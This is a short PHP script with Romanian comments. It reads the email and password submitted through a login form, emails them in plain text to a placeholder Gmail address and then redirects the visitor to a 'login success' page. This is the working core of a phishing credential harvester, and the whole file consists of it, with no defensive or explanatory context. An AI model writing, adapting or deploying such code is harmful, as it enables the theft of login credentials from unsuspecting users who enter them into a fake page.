<?php
if(isset($_POST['submit'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Trimiterea datelor către adresa de email
    $to = "adresa_ta_de_email@gmail.com";
    $subject = "Date de autentificare";
    $message = "Email: ".$email."\n"."Parolă: ".$password;
    $headers = "From: adresa_tale_de_email@gmail.com";

    // Trimite email-ul
    mail($to, $subject, $message, $headers);

    // Redirectează către o altă pagină după trimiterea datelor
    header("Location: login_success.html");
}
?>
